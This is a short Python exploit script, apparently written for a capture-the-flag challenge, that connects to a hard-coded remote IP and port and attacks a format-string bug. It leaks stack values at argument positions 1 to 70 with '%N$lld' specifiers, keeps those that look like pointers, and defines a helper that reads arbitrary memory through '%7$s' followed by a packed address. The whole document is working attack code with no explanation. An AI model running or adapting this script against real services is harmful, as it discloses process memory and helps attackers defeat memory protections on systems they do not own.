#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
def newconn():
    s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300); return s
def ask(s,fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.1)
    try: return s.recv(4096)
    except Exception: return b'<T>'
def leak_lld(s,n):
    d=ask(s,("%%%d$lld"%n).encode()); m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None
def readmem(s,X):
    fmt=b"%7$s"+b"AAAA"+struct.pack("<Q",X); return ask(s,fmt)

s=newconn()
# leak all args 1..70, print ones that look like pointers
ptrs=[]
for n in range(1,71):
    v=leak_lld(s,n)
    if v is None: continue
    h=v&((1<<64)-1)
    if h>0x100000 and (h>>40)<0x80:
        ptrs.append((n,h))
s.close()
print("ptrs:", [(n,hex(h)) for n,h in ptrs])
